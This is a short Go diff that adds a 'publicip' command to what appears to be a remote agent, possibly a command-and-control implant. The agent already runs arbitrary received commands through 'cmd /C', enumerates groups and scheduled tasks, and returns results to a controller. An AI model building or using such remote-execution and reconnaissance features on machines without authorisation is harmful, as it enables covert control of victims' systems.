@@ -120,6 +120,8 @@ func executeCommandAndSendResult(cmd Command) {
             listGroup(cmd)
     case cmd.Cmd == "scheduled_task":
             listScheduledTask(cmd)
+    case cmd.Cmd == "publicip":
+            publicIp(cmd)
     default:
         executeOtherCommand(cmd)
     }
@@ -252,6 +254,32 @@ func listScheduledTask(cmd Command) {
     })
 }
 
+func publicIp(cmd Command) {
+    resp, err := http.Get("https://ipinfo.io/ip")
+    if err != nil {
+        sendResult(CommandResult{
+            ID:     cmd.ID,
+            Result: fmt.Sprintf("Error fetching public IP: %v", err),
+        })
+        return
+    }
+    defer resp.Body.Close()
+
+    body, err := ioutil.ReadAll(resp.Body)
+    if err != nil {
+        sendResult(CommandResult{
+            ID:     cmd.ID,
+            Result: fmt.Sprintf("Error reading response: %v", err),
+        })
+        return
+    }
+
+    publicIP := strings.TrimSpace(string(body))
+    sendResult(CommandResult{
+        ID:     cmd.ID,
+        Result: publicIP,
+    })
+}
 
 func executeOtherCommand(cmd Command) {
     output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
